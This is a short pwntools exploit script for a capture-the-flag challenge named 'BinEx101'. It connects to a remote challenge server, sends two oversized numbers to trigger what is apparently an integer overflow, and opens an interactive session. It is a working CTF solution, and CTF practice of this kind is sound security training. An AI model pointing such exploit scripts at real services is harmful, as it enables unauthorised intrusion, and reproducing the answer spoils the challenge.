#!/usr/bin/python3

from pwn import *

target = './BinEx101'

#context.log_level = 'error'
context.update(terminal = ['tmux','splitw'])

#==========================================================
#           FUNCTIONS
#==========================================================


#==========================================================
#           CODE
#==========================================================

#p = process(target)#, env={"LD_PRELOAD":"libc.so.6"})

p = remote('challenge.acictf.com',47213)

#gdb.attach(p)
num1 = '99999999999'
num2 = '999999999'

print(p.recvuntil('number:'))
p.sendline(num1)

print(p.recvuntil('number:'))
p.sendline(num2)



p.interactive()
